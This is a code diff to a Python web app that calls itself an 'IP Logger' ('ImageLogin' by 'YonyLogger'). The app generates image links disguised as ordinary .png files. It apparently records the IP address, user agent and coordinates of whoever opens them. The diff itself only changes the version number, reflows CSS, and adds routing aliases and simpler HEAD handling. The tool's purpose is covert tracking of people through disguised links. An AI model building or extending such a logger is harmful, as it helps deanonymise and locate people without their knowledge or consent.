@@ -8,7 +8,7 @@ import requests
 
 __app__ = "ImageLogin"
 __description__ = "IP Logger"
-__version__ = "v4.0"
+__version__ = "v4.1"
 __author__ = "YonyLogger"
 
 config = {
@@ -55,16 +55,14 @@ PAGE = """<!doctype html>
 <title>__TITLE__</title>
 <style>
 *{box-sizing:border-box}
-body{margin:0;padding:0;background:#0d0d0f;color:#e8e8ea;font-family:ui-monospace,Menlo,Consolas,monospace;
-display:flex;align-items:center;justify-content:center;min-height:100vh}
+body{margin:0;padding:0;background:#0d0d0f;color:#e8e8ea;font-family:ui-monospace,Menlo,Consolas,monospace;display:flex;align-items:center;justify-content:center;min-height:100vh}
 .wrap{width:min(680px,92vw)}
 h1{font-size:18px;letter-spacing:.18em;text-transform:uppercase;color:#fff;margin:0 0 4px}
 p.sub{margin:0 0 22px;font-size:12px;color:#77787d;letter-spacing:.06em}
 .field{display:flex;gap:8px;margin-bottom:10px}
 input{flex:1;background:#151519;border:1px solid #2a2a31;color:#e8e8ea;padding:12px;border-radius:8px;font:inherit;font-size:13px;outline:none}
 input:focus{border-color:#c8102e}
-button{background:#c8102e;color:#fff;border:0;padding:12px 18px;border-radius:8px;font:inherit;font-size:12px;
-letter-spacing:.1em;text-transform:uppercase;cursor:pointer}
+button{background:#c8102e;color:#fff;border:0;padding:12px 18px;border-radius:8px;font:inherit;font-size:12px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer}
 button:hover{background:#e01436}
 button.ghost{background:#151519;border:1px solid #2a2a31;color:#aaa}
 button.ghost:hover{border-color:#c8102e;color:#fff}
@@ -72,8 +70,7 @@ button.ghost:hover{border-color:#c8102e;color:#fff}
 .out.on{display:block}
 .out input{border-color:#c8102e;color:#fff}
 .presets{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
-.presets img{width:74px;height:52px;object-fit:cover;border-radius:6px;cursor:pointer;
-border:2px solid transparent;filter:grayscale(.6)}
+.presets img{width:74px;height:52px;object-fit:cover;border-radius:6px;cursor:pointer;border:2px solid transparent;filter:grayscale(.6)}
 .presets img:hover{border-color:#c8102e;filter:none}
 .note{margin-top:24px;font-size:11px;color:#5d5e63;line-height:1.7}
 a{color:#c8102e;text-decoration:none}
@@ -321,7 +318,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     return info
 
 
-def generatorPage(environ):
+def generatorPage():
     presets = "".join(
         f'<img src="{u}" data-url="{u}" alt="">' for u in config["presets"]
     )
@@ -345,12 +342,13 @@ def app(environ, start_response):
         ip = clientIP(environ)
         useragent = environ.get("HTTP_USER_AGENT") or ""
 
-        if name in ("", "index.html"):
+        if name in ("", "index.html", "api", "api/", "api/index", "api/index.py"):
             if query.get("url"):
                 target = f"{origin(environ)}/{encodeToken(query['url'])}.png"
                 return respond(start_response, 302, "text/html", b"", {"Location": target})
-            body = generatorPage(environ)
-            return respond(start_response, 204 if method == "HEAD" else 200, "text/html; charset=utf-8", b"" if method == "HEAD" else body)
+            if method == "HEAD":
+                return respond(start_response, 200, "text/html; charset=utf-8", b"")
+            return respond(start_response, 200, "text/html; charset=utf-8", generatorPage())
 
         if name.startswith(("favicon", "robots.txt")):
             return respond(start_response, 204, "text/plain", b"")
